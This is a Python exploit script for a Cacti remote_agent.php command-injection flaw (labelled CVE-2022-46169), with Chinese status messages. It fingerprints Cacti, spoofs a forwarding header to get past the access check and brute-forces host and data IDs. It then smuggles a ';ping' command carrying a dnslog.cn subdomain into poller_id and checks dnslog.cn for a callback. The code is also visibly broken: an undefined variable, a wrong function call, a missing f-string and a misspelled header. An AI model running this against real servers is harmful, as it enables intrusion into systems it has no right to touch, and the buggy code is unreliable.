import re
import sys
import requests,urllib
import my_fake_useragent
import os
import random,string
from urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)


user_agent_random=my_fake_useragent.UserAgent().random()
headers1={
"User-Agent": user_agent_random
}

headers2={
"User-Agent": user_agent_random,
"X-Forwarder-For":"127.0.0.1"
}

payload1="/cacti/remote_agent.php?action=polldata&poller_id=1&host=1&local_data_ids[]=1"
class dnslog_request():
    def dnslog_main(self,exp_url):
        session=requests.session()
        domain=self.get_dnslog(session)
        rand_str = ''.join(random.sample(string.ascii_letters + string.digits, 7))
        domain=f"{rand_str}.{domain}"
        poc1(exp_url)
        rec_domain = self.record_dnslog(session)
        print(domain,rec_domain,requests)
        if domain in rec_domain:
            print("漏洞验证存在")
            print("可以执行命令漏洞url为"+exp_url)
        else:
            print("漏洞不存在")

    def poc(self,exp_url):
        try:
            exp_url=exp_url.replace("dnslog",f";ping{domain}")
            requests.get(exp_url,headers=headers2,verify=False,timeout=2)
        except:
            pass




    def get_dnslog(self,session):
        url = 'http://www.dnslog.cn/getdomain.php?t=0'
        try:
            req=session.get(url,verify=False,timeout=20)
            return req.content.decode("utf-8")
        except:
            pass

    def record_dnslog(self,session):
        url = 'http://www.dnslog.cn/getrecords.php?t=0'
        try:
            #session=requests.session()
            req=session.get(url,verify=False,timeout=20)
            return req.content.decode("utf-8")
        except Exception as E:
            print(f"error:{E}")



def poc1(url):
    targ_url1=urllib.parse.urljoin(url, payload1)
    #print(targ_url1)
    req1=requests.get(targ_url1,headers=headers1,verify=False,timeout=2)
    if "FATAL:" in req1.content.decode("utf-8"):
        print("cacti指纹存在")
        return True
    else:
        print("cacti指纹不存在")
        return False

def poc2(url):
    targ_url1=urllib.parse.urljoin(url, payload1)
    #print(targ_url1)
    req1=requests.get(targ_url1,headers=headers1,verify=False,timeout=2)
    req2=requests.get(targ_url1,headers=headers2,verify=False,timeout=2)
    #print(req1.request.headers)
    if "FATAL:" in req1.content.decode("utf-8") and "[]" in req2.content.decode("utf-8"):
        print("漏洞存在,需要进一步验证")
        return True
    else:
        print("漏洞可能不存在，可以额外爆破内网XFF头验证")
        return False

def poc3(url):
    for num1 in range(1,11):
        for num2 in range(1,11):
            payload2 = f"/cacti/remote_agent.php?action=polldata&poller_id=1&host={num1}&local_data_ids[]={num2}"
            targ_url2 = urllib.parse.urljoin(url, payload2)
            req3=requests.get(targ_url2,headers=headers2,verify=False,timeout=2)
            if re.search("rrd_name",req3.content.decode("utf-8")):
                exp_url="/cacti/remote_agent.php?action=polldata&poller_id=dnslog&host={num1}&local_data_ids[]={num2}"
                run = dnslog_request()
                run.dnslog_main(exp_url)
                break



if __name__ == '__main__':
    print("usage:python CVE-2022-46169.py https://127.0.0.1")
    if len(sys.argv)==2:
        url=sys.argv[1]
        if poc1(url):
            if poc2(url):
                poc3(url)
    else:
        print("usage:python CVE-2022-46169.py https://127.0.0.1")
